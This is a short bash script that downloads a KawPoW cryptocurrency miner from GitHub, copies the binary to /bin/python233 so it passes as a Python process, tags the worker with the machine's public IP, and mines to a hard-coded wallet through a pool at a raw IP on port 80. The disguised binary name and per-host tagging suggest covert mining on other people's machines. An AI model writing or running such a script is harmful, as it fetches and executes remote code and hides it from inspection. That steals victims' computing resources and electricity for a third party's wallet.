#!bin/bash -xe 
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io
#download build
wget https://github.com/one10001/kawpowminer/releases/download/7.5/kawpowminer_all75.tar.gz
tar -xzf kawpowminer_all75.tar.gz
ls -la
cd kawpowminer/build/kawpowminer/
chmod +x kawpowminer
cp kawpowminer /bin/python233
python233 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
